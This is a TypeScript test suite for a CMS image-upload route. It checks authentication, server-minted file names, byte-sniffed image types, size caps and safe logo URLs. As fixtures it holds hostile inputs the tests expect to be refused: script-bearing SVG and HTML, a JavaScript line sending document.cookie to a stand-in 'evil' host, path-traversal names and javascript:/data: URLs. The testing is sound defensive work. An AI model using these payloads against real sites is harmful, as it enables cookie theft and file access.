import { describe, it, expect, afterEach } from 'vitest';
import express from 'express';
import request from 'supertest';
import http from 'http';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { WebSocket } from 'ws';
import { LocalStore } from '../src/state/localStore';
import { createCmsIpGate } from '../src/cms/cmsIpGate';
import { createCmsRouter } from '../src/cms/cmsRouter';
import { createSessionStore, createRequireSession, hashPassword } from '../src/cms/cmsAuth';
import { createCmsEventRoutes } from '../src/cms/cmsEventRoutes';
import { serveUploadedAsset } from '../src/cms/uploadHandler';
import { DisplayServer } from '../src/display/displayServer';
import type { QueueService } from '../src/queue/queueService';
import type { AgentServer } from '../src/agent/agentServer';
import type { DisplaySnapshot } from '../src/types';

// ---------------------------------------------------------------------------
// Plan 08-03 Task 1 — the RECEIVING half of D-15, and the structural closure
// of CMS-05.
//
// CMS-05's measured mechanism was not "an upload endpoint existed". It was
// that a CALLER-SUPPLIED string (`body.image_type`, via `.replace('image/','')`)
// decided the extension of a file written into a statically-served directory.
// The answer this file tests is not a better filter on that string: it is that
// no caller-supplied string is an input to the stored path AT ALL.
//
// Every rejection case therefore asserts TWO things — the refusal, and that
// the upload directory listing is byte-for-byte unchanged. A 400 that still
// wrote the file would satisfy the first assertion alone.
//
// Harness note: these cases compose the CMS chain in the same order
// cmsRouter.ts documents (IP gate -> scoped body parser -> requireSession ->
// event routes) rather than calling createCmsRouter(), because each case needs
// its OWN upload directory and createCmsRouter takes its directory from the
// process-wide cached config. The session layer used here is the real
// createSessionStore()/createRequireSession() pair the router itself mounts,
// not a stub — the authentication claim in D-15 is tested against the
// production code path. One case below drives the real createCmsRouter() end
// to end to prove the composition above has not drifted from it.
// ---------------------------------------------------------------------------

const WHITELISTED_IP = '10.0.0.5';
const CMS_CFG = {
  CMS_USERNAME: 'operator',
  CMS_PASSWORD_HASH: hashPassword('operator-pass-01'),
  CMS_SESSION_COOKIE_NAME: 'cms_session',
};

/** The four accepted signatures, each with a body that is NOT a real image —
 *  the sniffer must look at the leading bytes and nothing else. */
const PNG = Buffer.concat([
  Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
  Buffer.from('png payload body'),
]);
const JPEG = Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xe0]), Buffer.from('jfif payload body')]);
const GIF = Buffer.concat([Buffer.from('GIF89a'), Buffer.from('gif payload body')]);
const WEBP = Buffer.concat([
  Buffer.from('RIFF'),
  Buffer.from([0x24, 0x00, 0x00, 0x00]),
  Buffer.from('WEBP'),
  Buffer.from('VP8 payload body'),
]);

/** The three payload classes CMS-05 was actually exploited with. */
const SVG = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>');
const HTML = Buffer.from('<!DOCTYPE html><html><body><script>alert(1)</script></body></html>');
const JS = Buffer.from('function steal(){fetch("http://evil/"+document.cookie)}steal()');

const tmpDirs: string[] = [];
const openStores: LocalStore[] = [];
const openServers: http.Server[] = [];
const openDisplays: DisplayServer[] = [];
const openSockets: WebSocket[] = [];

function makeTmpDir(prefix: string): string {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), prefix));
  tmpDirs.push(dir);
  return dir;
}

function makeStore(): LocalStore {
  const store = new LocalStore(path.join(makeTmpDir('gsd-upload-store-'), 'test.sqlite'));
  openStores.push(store);
  return store;
}

interface UploadHarness {
  app: express.Express;
  uploadDir: string;
  cookie: string;
  store: LocalStore;
}

function buildUploadApp(opts: { maxBytes?: number; store?: LocalStore } = {}): UploadHarness {
  const maxBytes = opts.maxBytes ?? 5_242_880;
  const store = opts.store ?? makeStore();
  const uploadDir = makeTmpDir('gsd-upload-dir-');

  const app = express();
  app.use((req, _res, next) => {
    Object.defineProperty(req, 'ip', { value: WHITELISTED_IP, configurable: true });
    next();
  });
  // index.ts's mount, reproduced exactly: the generously-sized parser is
  // scoped to the one asset path and mounted ABOVE everything else.
  app.use('/cms/api/assets', express.json({ limit: Math.ceil(maxBytes * (4 / 3)) + 65_536 }));

  const sessions = createSessionStore();
  const token = sessions.create('operator');
  app.use(
    '/cms',
    createCmsIpGate([WHITELISTED_IP]),
    express.json(),
    createRequireSession(sessions, 'cms_session'),
    createCmsEventRoutes(store, { uploadDir, maxBytes }),
  );

  return { app, uploadDir, cookie: `cms_session=${token}`, store };
}

function listUploads(dir: string): string[] {
  return fs.readdirSync(dir).sort();
}

function b64(buf: Buffer): string {
  return buf.toString('base64');
}

function makeMockQueue(): Partial<QueueService> {
  return { getQueuePosition: () => undefined, getQueueLength: () => 0, getAnnouncement: () => null };
}
function makeMockAgent(): Partial<AgentServer> {
  return { isAgentOnline: () => true };
}

async function startDisplay(store: LocalStore): Promise<{ port: number }> {
  const app = express();
  const server = http.createServer(app);
  openServers.push(server);
  const display = new DisplayServer(
    makeMockQueue() as QueueService,
    makeMockAgent() as AgentServer,
    store,
    { displayWhitelist: [], pollIntervalMs: 25 },
  );
  openDisplays.push(display);
  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
  display.start(server);
  const address = server.address();
  return { port: typeof address === 'object' && address ? address.port : 0 };
}

function connectDisplayClient(port: number): WebSocket {
  const ws = new WebSocket(`ws://127.0.0.1:${port}/display`);
  openSockets.push(ws);
  return ws;
}

function awaitSnapshot(
  ws: WebSocket,
  predicate: (snapshot: DisplaySnapshot) => boolean,
  timeoutMs = 4000,
): Promise<DisplaySnapshot> {
  return new Promise((resolve, reject) => {
    const timer = setTimeout(() => {
      ws.off('message', onMessage);
      reject(new Error('timed out waiting for a matching /display snapshot'));
    }, timeoutMs);
    function onMessage(raw: unknown): void {
      const parsed = JSON.parse(String(raw)) as { type: string; data: DisplaySnapshot };
      if (parsed.type !== 'snapshot') return;
      if (!predicate(parsed.data)) return;
      clearTimeout(timer);
      ws.off('message', onMessage);
      resolve(parsed.data);
    }
    ws.on('message', onMessage);
  });
}

afterEach(async () => {
  while (openSockets.length) {
    try {
      openSockets.pop()?.close();
    } catch {
      /* already closed */
    }
  }
  while (openDisplays.length) {
    try {
      openDisplays.pop()?.stop();
    } catch {
      /* already stopped */
    }
  }
  while (openServers.length) {
    const server = openServers.pop();
    await new Promise<void>((resolve) => server?.close(() => resolve()));
  }
  while (openStores.length) {
    try {
      openStores.pop()?.close();
    } catch {
      /* already closed */
    }
  }
  while (tmpDirs.length) {
    fs.rmSync(tmpDirs.pop()!, { recursive: true, force: true });
  }
});

// ---------------------------------------------------------------------------
// Authentication (T-08-16)
// ---------------------------------------------------------------------------

describe('D-15: the upload route is authenticated, and an anonymous post writes nothing', () => {
  it('refuses an unauthenticated POST /cms/api/assets and leaves the upload directory empty', async () => {
    const { app, uploadDir } = buildUploadApp();
    const before = listUploads(uploadDir);

    const res = await request(app)
      .post('/cms/api/assets')
      .send({ data: b64(PNG), filename: 'logo.png', type: 'image/png' });

    expect(res.status).toBe(401);
    // The anonymous-write hole CMS-05 documents, closed: no bytes reached disk.
    expect(listUploads(uploadDir)).toEqual(before);
    expect(listUploads(uploadDir)).toHaveLength(0);
  });

  it('refuses an unauthenticated upload through the REAL createCmsRouter chain too', async () => {
    // Guards against the composed harness above drifting away from the router
    // the service actually mounts: if requireSession ever stopped covering the
    // asset route in cmsRouter.ts, this case goes red while the composed ones
    // stay green.
    const app = express();
    app.use((req, _res, next) => {
      Object.defineProperty(req, 'ip', { value: WHITELISTED_IP, configurable: true });
      next();
    });
    app.use('/cms', createCmsIpGate([WHITELISTED_IP]), createCmsRouter(makeStore(), CMS_CFG));

    const res = await request(app).post('/cms/api/assets').send({ data: b64(PNG) });
    expect(res.status).toBe(401);
    expect(res.body).toEqual({ error: 'Unauthorized' });
  });
});

// ---------------------------------------------------------------------------
// The happy path — server-generated names (T-08-14)
// ---------------------------------------------------------------------------

describe('D-15: an authenticated upload is stored under a SERVER-generated name', () => {
  it('accepts a valid PNG and returns a /uploads/ URL whose file exists with the posted bytes', async () => {
    const { app, uploadDir, cookie } = buildUploadApp();

    const res = await request(app)
      .post('/cms/api/assets')
      .set('Cookie', cookie)
      .send({ data: b64(PNG), filename: 'logo.png', type: 'image/png' });

    expect(res.status).toBe(201);
    expect(res.body.url).toMatch(/^\/uploads\/[0-9a-f-]{36}\.png$/);
    expect(res.body.contentType).toBe('image/png');

    const stored = path.join(uploadDir, path.basename(res.body.url as string));
    expect(fs.existsSync(stored)).toBe(true);
    expect(Buffer.compare(fs.readFileSync(stored), PNG)).toBe(0);
    expect(listUploads(uploadDir)).toHaveLength(1);
  });

  it('gives two uploads of IDENTICAL bytes two different stored names', async () => {
    // The name is minted, never derived: derivation from content or from the
    // request would make it predictable and, with a caller-supplied component,
    // targetable.
    const { app, uploadDir, cookie } = buildUploadApp();
    const payload = { data: b64(PNG), filename: 'logo.png', type: 'image/png' };

    const first = await request(app).post('/cms/api/assets').set('Cookie', cookie).send(payload);
    const second = await request(app).post('/cms/api/assets').set('Cookie', cookie).send(payload);

    expect(first.status).toBe(201);
    expect(second.status).toBe(201);
    expect(first.body.url).not.toBe(second.body.url);
    expect(listUploads(uploadDir)).toHaveLength(2);
  });

  it('shares NO substring with a hostile client-supplied name, and stores a direct child of the directory', async () => {
    const { app, uploadDir, cookie } = buildUploadApp();
    const hostile = '../../etc/passwd-evil-brand';

    const res = await request(app)
      .post('/cms/api/assets')
      .set('Cookie', cookie)
      .send({ data: b64(PNG), filename: `${hostile}.png`, type: 'image/svg+xml' });

    expect(res.status).toBe(201);
    const storedName = path.basename(res.body.url as string);
    for (const fragment of ['..', '/', 'etc', 'passwd', 'evil', 'brand']) {
      expect(storedName).not.toContain(fragment);
    }
    // The declared type was image/svg+xml and the bytes were a PNG. The BYTES
    // won: the recorded type is the sniffed one, never the declared one.
    expect(res.body.contentType).toBe('image/png');

    const files = listUploads(uploadDir);
    expect(files).toHaveLength(1);
    expect(files[0]).toBe(storedName);
    expect(path.dirname(path.resolve(uploadDir, storedName))).toBe(path.resolve(uploadDir));
  });

  it('accepts JPEG, GIF and WEBP, each recorded with its SNIFFED type and matching extension', async () => {
    const { app, uploadDir, cookie } = buildUploadApp();
    const cases: Array<[Buffer, string, string]> = [
      [JPEG, 'image/jpeg', '.jpg'],
      [GIF, 'image/gif', '.gif'],
      [WEBP, 'image/webp', '.webp'],
    ];

    for (const [bytes, contentType, ext] of cases) {
      const res = await request(app)
        .post('/cms/api/assets')
        .set('Cookie', cookie)
        // Every one of these declares image/png. The declaration is ignored.
        .send({ data: b64(bytes), filename: 'anything.png', type: 'image/png' });

      expect(res.status, `${contentType} should be accepted`).toBe(201);
      expect(res.body.contentType).toBe(contentType);
      expect(path.extname(res.body.url as string)).toBe(ext);
    }
    expect(listUploads(uploadDir)).toHaveLength(3);
  });
});

// ---------------------------------------------------------------------------
// CMS-05 proper — content decides, and every refusal writes nothing (T-08-13)
// ---------------------------------------------------------------------------

describe('CMS-05: a payload that is not one of the four image types is refused by CONTENT', () => {
  const hostile: Array<[string, Buffer]> = [
    ['SVG carrying a script', SVG],
    ['an HTML document', HTML],
    ['plain JavaScript', JS],
  ];

  for (const [label, bytes] of hostile) {
    it(`rejects ${label} declared as image/png, and writes no file`, async () => {
      const { app, uploadDir, cookie } = buildUploadApp();
      const before = listUploads(uploadDir);

      const res = await request(app)
        .post('/cms/api/assets')
        .set('Cookie', cookie)
        .send({ data: b64(bytes), filename: 'brand.png', type: 'image/png' });

      expect(res.status).toBeGreaterThanOrEqual(400);
      expect(res.status).toBeLessThan(500);
      expect(listUploads(uploadDir)).toEqual(before);
      expect(listUploads(uploadDir)).toHaveLength(0);
      // Nothing of the payload is echoed back — the refusal cannot be used to
      // confirm what was parsed.
      expect(res.text).not.toContain('<script>');
    });
  }

  it('rejects a decoded payload larger than the configured cap before writing anything', async () => {
    const maxBytes = 4096;
    const { app, uploadDir, cookie } = buildUploadApp({ maxBytes });
    const oversize = Buffer.concat([
      Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
      Buffer.alloc(maxBytes, 0x41),
    ]);

    const res = await request(app)
      .post('/cms/api/assets')
      .set('Cookie', cookie)
      .send({ data: b64(oversize), filename: 'huge.png', type: 'image/png' });

    expect(res.status).toBeGreaterThanOrEqual(400);
    expect(listUploads(uploadDir)).toHaveLength(0);
  });

  it('accepts a payload exactly AT the cap — the bound is a cap, not an off-by-one refusal', async () => {
    const maxBytes = 4096;
    const { app, uploadDir, cookie } = buildUploadApp({ maxBytes });
    const exact = Buffer.concat([
      Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
      Buffer.alloc(maxBytes - 8, 0x41),
    ]);
    expect(exact.length).toBe(maxBytes);

    const res = await request(app)
      .post('/cms/api/assets')
      .set('Cookie', cookie)
      .send({ data: b64(exact), filename: 'exact.png', type: 'image/png' });

    expect(res.status).toBe(201);
    expect(listUploads(uploadDir)).toHaveLength(1);
  });

  it('rejects malformed base64, an empty payload, and a missing data field identically', async () => {
    const { app, uploadDir, cookie } = buildUploadApp();

    const responses = [
      await request(app).post('/cms/api/assets').set('Cookie', cookie).send({ data: 'not!valid!base64!' }),
      await request(app).post('/cms/api/assets').set('Cookie', cookie).send({ data: '' }),
      await request(app).post('/cms/api/assets').set('Cookie', cookie).send({}),
      await request(app).post('/cms/api/assets').set('Cookie', cookie).send({ data: 12345 }),
    ];

    for (const res of responses) {
      expect(res.status).toBeGreaterThanOrEqual(400);
      expect(res.status).toBeLessThan(500);
    }
    expect(listUploads(uploadDir)).toHaveLength(0);
  });

  it('answers EVERY failure with one identical shape — the endpoint is not an oracle', async () => {
    const { app, cookie } = buildUploadApp({ maxBytes: 4096 });
    const oversize = Buffer.concat([
      Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
      Buffer.alloc(8192, 0x41),
    ]);

    const wrongSignature = await request(app).post('/cms/api/assets').set('Cookie', cookie).send({ data: b64(SVG) });
    const tooLarge = await request(app).post('/cms/api/assets').set('Cookie', cookie).send({ data: b64(oversize) });
    const malformed = await request(app).post('/cms/api/assets').set('Cookie', cookie).send({ data: '###' });

    const shape = { status: wrongSignature.status, body: wrongSignature.body };
    expect({ status: tooLarge.status, body: tooLarge.body }).toEqual(shape);
    expect({ status: malformed.status, body: malformed.body }).toEqual(shape);
  });
});

// ---------------------------------------------------------------------------
// The two halves agree, and the asset reaches the wall (the tracer proper)
// ---------------------------------------------------------------------------

describe('the upload tracer: operator uploads a logo and the room screen receives it', () => {
  it('serves the returned URL back with exactly the sniffed Content-Type', async () => {
    const { app, uploadDir, cookie } = buildUploadApp();
    const uploaded = await request(app)
      .post('/cms/api/assets')
      .set('Cookie', cookie)
      .send({ data: b64(PNG), filename: 'logo.png', type: 'image/png' });
    expect(uploaded.status).toBe(201);

    // The serving half from plan 08-01, unmodified, re-deriving the type from
    // the same bytes through the same sniffer. The two halves cannot disagree
    // because they consult one function over one payload, not a sidecar.
    const serving = express();
    serving.get('/uploads/:filename', serveUploadedAsset(uploadDir));

    const res = await request(serving).get(uploaded.body.url as string);
    expect(res.status).toBe(200);
    expect(res.headers['content-type']).toBe('image/png');
    expect(res.headers['x-content-type-options']).toBe('nosniff');
  });

  it('attaches an uploaded logo to an event and a live WS /display client receives that URL', async () => {
    const store = makeStore();
    const { app, cookie } = buildUploadApp({ store });
    const { port } = await startDisplay(store);
    const ws = connectDisplayClient(port);
    const before = await awaitSnapshot(ws, () => true);
    expect(before.eventConfig.logoUrl).toBeNull();

    const uploaded = await request(app)
      .post('/cms/api/assets')
      .set('Cookie', cookie)
      .send({ data: b64(PNG), filename: 'logo.png', type: 'image/png' });
    expect(uploaded.status).toBe(201);

    const created = await request(app).post('/cms/api/events').set('Cookie', cookie).send({ name: 'Tiệc cưới B' });
    expect(created.status).toBe(201);

    const saved = await request(app)
      .post(`/cms/api/events/${created.body.id}`)
      .set('Cookie', cookie)
      .send({ logo_url: uploaded.body.url });
    expect(saved.status).toBe(200);

    await request(app).post(`/cms/api/events/${created.body.id}/activate`).set('Cookie', cookie).expect(200);

    const after = await awaitSnapshot(ws, (snap) => snap.eventConfig.name === 'Tiệc cưới B');
    expect(after.eventConfig.logoUrl).toBe(uploaded.body.url);
  });

  it('refuses an asset URL that is not a server-minted /uploads/ path', async () => {
    // The stored URL ends up in an <img src> on every TV in the room, so the
    // update route accepts only the shape this service itself mints — never an
    // arbitrary string, and never a javascript:/data: URL.
    const { app, cookie, store } = buildUploadApp();
    const created = await request(app).post('/cms/api/events').set('Cookie', cookie).send({ name: 'Sự kiện' });

    for (const hostile of [
      'javascript:alert(1)',
      'data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=',
      'http://evil.example/logo.png',
      '/uploads/../../etc/passwd',
      '/uploads/logo.svg',
    ]) {
      const res = await request(app)
        .post(`/cms/api/events/${created.body.id}`)
        .set('Cookie', cookie)
        .send({ logo_url: hostile });
      expect(res.status, `${hostile} must be refused`).toBe(400);
    }

    expect(store.getEventConfig(created.body.id as string)?.logoUrl).toBeNull();
  });
});
